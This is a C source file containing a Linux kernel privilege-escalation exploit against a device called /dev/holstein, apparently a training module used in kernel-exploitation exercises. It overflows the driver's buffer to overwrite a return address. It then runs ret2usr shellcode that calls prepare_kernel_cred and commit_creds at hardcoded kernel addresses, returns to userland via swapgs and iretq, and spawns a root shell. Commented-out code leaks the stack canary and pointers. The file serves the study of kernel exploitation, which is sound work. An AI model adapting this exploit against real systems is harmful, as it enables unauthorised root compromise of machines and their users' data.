#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

#define BUFFER_SIZE 0x400

int dev;

/* Backup registers */
long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

/* Helpers */
void debug(){
    puts("paused execution");
    getchar();
}

int open_dev(void){
    return open("/dev/holstein", O_RDWR);
}

// long *getleak(unsigned count){
//     char buf[BUFFER_SIZE + sizeof(long)*count];
//     long *leak = calloc(count, sizeof(long));

//     read(dev, buf, sizeof(buf));
//     memcpy(leak, buf+BUFFER_SIZE, sizeof(long)*count);
//     return leak;
// }

void send_payload(void *payload, size_t size){
    char buf[BUFFER_SIZE+size];

    memcpy(buf+BUFFER_SIZE, payload, size);
    write(dev, buf, BUFFER_SIZE+size);
}

/* Exploit */
void getshell(void){
    if(!getuid()){
        puts("[+] Got root");
        system("/bin/sh");
    } else{
        puts("[-] Exploit failed");
    }
}
long user_rip = (long)getshell;

void shellcode(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff8106e240;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff8106e390;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main(void){
    save_state();
    dev =  open_dev();
    long payload[2];

    // long *leak = getleak(3);
    // long canary = leak[0];
    // long bp = leak[1];
    // long ip = leak[2] - 0x0;

    // printf("[+] Canary: %lx\n", canary);
    // printf("[+] BP: %lx\n", bp);
    // printf("[+] IP: %lx\n", ip);

    printf("[+] Shellcode @ %p\n", shellcode);
    payload[1] = (long)shellcode;
    send_payload(payload, sizeof(payload));

    return 0;
}